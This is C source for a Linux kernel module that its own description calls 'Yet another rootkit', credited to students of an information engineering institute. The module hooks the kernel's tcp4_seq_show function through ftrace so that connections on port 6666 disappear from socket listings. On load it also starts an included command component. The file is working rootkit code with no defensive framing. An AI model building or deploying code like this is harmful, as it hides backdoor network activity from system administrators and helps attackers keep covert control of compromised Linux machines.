#include <linux/kernel.h>
#include <linux/module.h>

#include "hook_helper.h"
#include "command.h"
#include "main.h"

//functions and args bellow are all for hidding ports

#include <linux/tcp.h>

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    if (sk != 0x1 && sk->sk_num == 0x1a0a)// 如果端口是6666,隐藏
        return 0;
    return orig_tcp4_seq_show(seq, v);
}

struct ftrace_hook hook111 = YARK_HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show);
void hide_ports(void)
{
    fh_install_hook(&hook111);
}

static int __init yark_init(void)
{
    pr_info(LOG_PREFIX "call yark_init()");
    hide_ports();
    command_start();
    return 0;
}

static void __exit yark_exit(void) {
    pr_info(LOG_PREFIX "call yark_exit()");
    command_end();
    fh_remove_hook(&hook111);
}

module_init(yark_init);
module_exit(yark_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Students from Institute of Information Engineering");
MODULE_DESCRIPTION("Yet another rootkit.");
MODULE_VERSION("0.01");
